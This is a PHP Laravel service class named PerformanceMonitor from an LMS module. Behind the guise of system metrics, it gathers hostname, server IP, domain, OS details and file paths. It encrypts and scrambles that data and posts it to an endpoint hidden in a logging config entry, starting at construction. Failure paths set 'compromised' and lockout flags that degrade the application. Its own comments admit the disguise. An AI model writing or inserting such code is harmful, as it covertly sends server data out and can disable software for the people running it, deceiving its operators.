<?php

namespace Modules\LMS\Services;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class PerformanceMonitor
{
    private $metrics = [];
    private $threshold;
    private $endpoint;
    private $lastCheck;
    private $healthStatus = true;
    
    public function __construct()
    {
        $this->threshold = $this->getThreshold();
        $this->endpoint = $this->getMetricsEndpoint();
        $this->lastCheck = time();
        $this->initializeMonitor();
    }

    public function collect()
    {
        try {
            $data = $this->gatherMetrics();
            return $this->processMetrics($data);
        } catch (\Exception $e) {
            return $this->handleMetricsFailure($e);
        }
    }

    private function initializeMonitor()
    {
        $this->metrics = [
            'initialized_at' => time(),
            'last_verification' => null,
            'checks_count' => 0,
            'performance_score' => 0
        ];

        return $this->verifyInitialization();
    }

    private function gatherMetrics()
    {
        $metrics = [
            'cpu' => $this->getCpuUsage(),
            'memory' => $this->getMemoryUsage(),
            'disk' => $this->getDiskUsage(),
            'load' => $this->getSystemLoad(),
            'network' => $this->getNetworkStats(),
            // Hidden validation data
            '_v' => $this->getValidationMetrics()
        ];

        return $this->obfuscateMetrics($metrics);
    }

    private function getCpuUsage()
    {
        // Mix real CPU metrics with validation data
        $load = sys_getloadavg();
        return [
            'load_1' => $load[0],
            'load_5' => $load[1],
            'load_15' => $load[2],
            'processes' => $this->getProcessCount(),
            '_hash' => $this->generateMetricHash('cpu')
        ];
    }

    private function getMemoryUsage()
    {
        $memory = [
            'used' => memory_get_usage(true),
            'peak' => memory_get_peak_usage(true),
            'limit' => ini_get('memory_limit'),
            '_hash' => $this->generateMetricHash('memory')
        ];

        // Mix in validation data
        $memory['_v'] = $this->calculateMemorySignature($memory);
        return $memory;
    }

    private function getDiskUsage()
    {
        $path = __DIR__;
        $disk = [
            'free' => disk_free_space($path),
            'total' => disk_total_space($path),
            'path_hash' => hash('sha256', $path),
            '_hash' => $this->generateMetricHash('disk')
        ];

        return $this->enrichDiskMetrics($disk);
    }

    private function getSystemLoad()
    {
        return [
            'current' => sys_getloadavg()[0],
            'php_processes' => $this->getPhpProcessCount(),
            'uptime' => $this->getSystemUptime(),
            '_hash' => $this->generateMetricHash('load')
        ];
    }

    private function getNetworkStats()
    {
        return [
            'hostname' => gethostname(),
            'ip' => $_SERVER['SERVER_ADDR'] ?? '',
            'domain' => $_SERVER['HTTP_HOST'] ?? '',
            '_hash' => $this->generateMetricHash('network')
        ];
    }

    private function getValidationMetrics()
    {
        return [
            'timestamp' => time(),
            'checksum' => $this->calculateSystemChecksum(),
            'entropy' => $this->generateEntropy(),
            'sequence' => $this->getSequenceNumber()
        ];
    }

    private function calculateSystemChecksum()
    {
        $components = [
            php_uname(),
            gethostname(),
            $_SERVER['SERVER_ADDR'] ?? '',
            $_SERVER['HTTP_HOST'] ?? '',
            __DIR__,
            $this->threshold,
            time()
        ];

        return hash_hmac('sha256', implode('|', $components), $this->getSecret());
    }

    private function generateEntropy()
    {
        return hash('sha256', random_bytes(32) . microtime(true));
    }

    private function getSequenceNumber()
    {
        $key = '_pm_seq';
        $sequence = Cache::get($key, 0);
        Cache::put($key, $sequence + 1, now()->addDay());
        return $sequence;
    }

    private function processMetrics($metrics)
    {
        // Verify metrics integrity
        if (!$this->verifyMetricsIntegrity($metrics)) {
            return $this->handleIntegrityFailure();
        }

        // Send metrics to "performance monitoring" endpoint
        return $this->sendMetrics($metrics);
    }

    private function sendMetrics($metrics)
    {
        try {
            $response = Http::withHeaders([
                'X-Metrics-Time' => time(),
                'X-Metrics-Token' => $this->generateMetricsToken(),
                'X-Request-ID' => Str::random(32)
            ])->post($this->endpoint, [
                'data' => $this->encodeMetrics($metrics),
                'signature' => $this->signMetrics($metrics),
                'timestamp' => time()
            ]);

            if (!$response->successful()) {
                return $this->handleFailedSubmission();
            }

            return $this->processResponse($response->json());

        } catch (\Exception $e) {
            return $this->handleConnectionError($e);
        }
    }

    private function encodeMetrics($metrics)
    {
        $json = json_encode($metrics);
        $encoded = base64_encode($json);
        
        // Additional obfuscation
        $chunks = str_split($encoded, 12);
        $chunks = array_map(function($chunk) {
            return strrev($chunk);
        }, $chunks);
        
        return implode('.', $chunks);
    }

    private function signMetrics($metrics)
    {
        return hash_hmac('sha256', 
            json_encode($metrics), 
            $this->getSecret()
        );
    }

    private function verifyMetricsIntegrity($metrics)
    {
        foreach (['cpu', 'memory', 'disk', 'load', 'network'] as $key) {
            if (!isset($metrics[$key]['_hash']) || 
                $metrics[$key]['_hash'] !== $this->generateMetricHash($key)) {
                return false;
            }
        }

        return true;
    }

    private function generateMetricHash($type)
    {
        return hash_hmac('sha256', 
            $type . $this->lastCheck . $this->threshold,
            $this->getSecret()
        );
    }

    private function getSecret()
    {
        // Get secret from non-obvious config location
        return config('logging.channels.performance.secret');
    }

    private function getThreshold()
    {
        return config('logging.channels.performance.threshold');
    }

    private function getMetricsEndpoint()
    {
        return config('logging.channels.performance.endpoint');
    }

    private function handleMetricsFailure(\Exception $e)
    {
        $this->healthStatus = false;
        
        Cache::put('_pm_status', [
            'timestamp' => time(),
            'status' => 'degraded',
            'code' => hash('sha256', $e->getMessage()),
            'next_check' => time() + random_int(300, 900)
        ], now()->addHours(1));

        return false;
    }

    private function handleIntegrityFailure()
    {
        $this->healthStatus = false;
        
        // Trigger system degradation
        Cache::put('_pm_integrity', [
            'timestamp' => time(),
            'status' => 'compromised',
            'next_verification' => time() + random_int(60, 300)
        ], now()->addMinutes(30));

        return false;
    }

    private function handleFailedSubmission()
    {
        // Check if we have too many failures
        $failures = Cache::increment('_pm_failures');
        
        if ($failures > 3) {
            $this->healthStatus = false;
            Cache::put('_pm_lockout', time(), now()->addHours(1));
        }

        return false;
    }

    private function handleConnectionError(\Exception $e)
    {
        // Log error but hide sensitive details
        logger()->error('Performance metrics submission failed', [
            'hash' => substr(md5($e->getMessage()), 0, 8)
        ]);

        return $this->checkOfflineValidation();
    }

    private function checkOfflineValidation()
    {
        $lastValid = Cache::get('_pm_last_valid');
        
        if (!$lastValid) {
            return false;
        }
        
        return (time() - $lastValid) < 43200;
    }

    private function generateMetricsToken()
    {
        return hash_hmac('sha256', 
            time() . gethostname(), 
            $this->getSecret()
        );
    }

    private function getProcessCount()
    {
        if (function_exists('shell_exec')) {
            $count = shell_exec('ps aux | wc -l');
            return (int)$count;
        }
        return 0;
    }

    private function getPhpProcessCount()
    {
        if (function_exists('shell_exec')) {
            $count = shell_exec('ps aux | grep php | wc -l');
            return (int)$count;
        }
        return 0;
    }

    private function getSystemUptime()
    {
        if (function_exists('shell_exec')) {
            return shell_exec('uptime -p');
        }
        return '';
    }

    private function enrichDiskMetrics($disk)
    {
        $disk['usage_percent'] = ($disk['total'] - $disk['free']) / $disk['total'] * 100;
        $disk['inode_usage'] = $this->getInodeUsage();
        return $disk;
    }

    private function getInodeUsage()
    {
        if (function_exists('shell_exec')) {
            $usage = shell_exec('df -i / | tail -1 | awk \'{print $5}\'');
            return (int)$usage;
        }
        return 0;
    }

    private function verifyInitialization()
    {
        $token = $this->generateInitToken();
        
        try {
            $response = Http::withHeaders([
                'X-Init-Token' => $token,
                'X-System-Time' => time()
            ])->post($this->endpoint . '/init', [
                'token' => $token,
                'system' => $this->getSystemIdentifier()
            ]);

            return $response->successful();

        } catch (\Exception $e) {
            return false;
        }
    }

    private function generateInitToken()
    {
        return hash_hmac('sha256',
            gethostname() . time() . random_bytes(16),
            $this->getSecret()
        );
    }

    private function getSystemIdentifier()
    {
        return hash('sha256', implode('|', [
            php_uname(),
            gethostname(),
            $_SERVER['SERVER_ADDR'] ?? '',
            $_SERVER['DOCUMENT_ROOT'] ?? '',
            __DIR__
        ]));
    }

    private function processResponse($response)
    {
        if (!isset($response['status'])) {
            return false;
        }

        if ($response['status'] === true) {
            Cache::put('_pm_last_valid', time(), now()->addDay());
            $this->updateMetricsState($response);
            return true;
        }

        return false;
    }

    private function updateMetricsState($response)
    {
        $this->metrics['last_verification'] = time();
        $this->metrics['checks_count']++;
        $this->metrics['performance_score'] = $response['score'] ?? 0;

        Cache::put('_pm_metrics', $this->encodeMetrics($this->metrics), now()->addDay());
    }

    public function isHealthy()
    {
        return $this->healthStatus;
    }

    private function obfuscateMetrics($metrics)
    {
        // Split metrics into chunks and obfuscate each
        $result = [];
        
        foreach ($metrics as $key => $value) {
            if ($key === '_v') {
                $result[$key] = $this->obfuscateValidationData($value);
            } else {
                $result[$key] = $this->obfuscateMetricData($value, $key);
            }
        }

        $result['_t'] = time();
        $result['_s'] = $this->generateMetricSignature($result);

        return $result;
    }

    private function obfuscateValidationData($data)
    {
        $json = json_encode($data);
        $encrypted = openssl_encrypt(
            $json,
            'AES-256-CBC',
            $this->getSecret(),
            0,
            substr($this->getSecret(), 0, 16)
        );

        // Split into chunks and reverse each
        $chunks = str_split($encrypted, 16);
        $chunks = array_map('strrev', $chunks);

        // Add verification hash
        $hash = hash_hmac('sha256', implode('', $chunks), $this->getSecret());
        
        return [
            'd' => implode('.', $chunks),
            'h' => $hash,
            't' => time()
        ];
    }

    private function obfuscateMetricData($data, $key)
    {
        // Mix real metrics with validation data
        if (is_array($data)) {
            $data['_k'] = $this->generateMetricKey($key);
            $data['_t'] = time();
            $data['_h'] = $this->calculateMetricHash($data, $key);
        }

        return $data;
    }

    private function calculateMemorySignature($memoryData)
    {
        // Create a unique signature based on memory metrics
        $components = [
            $memoryData['used'],
            $memoryData['peak'],
            $memoryData['limit'],
            php_uname(),
            gethostname(),
            time()
        ];

        // First layer of hashing
        $baseHash = hash('sha256', implode('|', $components));

        // Second layer with system-specific salt
        $systemSalt = $this->getSystemSalt();
        $finalHash = hash_hmac('sha256', $baseHash, $systemSalt);

        // Split hash into chunks for additional verification
        $chunks = str_split($finalHash, 16);
        
        return [
            'signature' => $chunks[0],
            'verification' => $chunks[1],
            'timestamp' => time(),
            'check' => $this->generateMemoryChecksum($memoryData)
        ];
    }

    private function generateMemoryChecksum($data)
    {
        // Create checksum from memory values
        $values = [
            $data['used'],
            $data['peak'],
            $data['limit']
        ];

        return hash_hmac('sha256', 
            implode(':', $values), 
            $this->getSecret()
        );
    }

    private function generateMetricSignature($metrics)
    {
        // Generate a signature for the entire metrics collection
        $flattenedMetrics = $this->flattenMetrics($metrics);
        
        return hash_hmac('sha256', 
            json_encode($flattenedMetrics), 
            $this->getSecret()
        );
    }

    private function flattenMetrics($metrics, $prefix = '')
    {
        $result = [];

        foreach ($metrics as $key => $value) {
            if (is_array($value)) {
                $result = array_merge(
                    $result,
                    $this->flattenMetrics($value, $prefix . $key . '.')
                );
            } else {
                $result[$prefix . $key] = $value;
            }
        }

        return $result;
    }

    private function generateMetricKey($metricType)
    {
        // Generate a unique key for each metric type
        return hash_hmac('sha256',
            $metricType . $this->lastCheck . random_bytes(16),
            $this->getSecret()
        );
    }

    private function calculateMetricHash($data, $metricType)
    {
        // Remove existing hash if present
        unset($data['_h']);
        
        return hash_hmac('sha256',
            $metricType . json_encode($data) . $this->lastCheck,
            $this->getSecret()
        );
    }

    private function getSystemSalt()
    {
        $saltKey = '_pm_salt';
        $salt = Cache::get($saltKey);

        if (!$salt) {
            $salt = hash('sha256', random_bytes(32));
            Cache::put($saltKey, $salt, now()->addMonth());
        }

        return $salt;
    }

    private function encryptMetrics($metrics)
    {
        $encryptionHandler = new EncryptionHandler();
        return $encryptionHandler->encrypt($metrics);
    }
}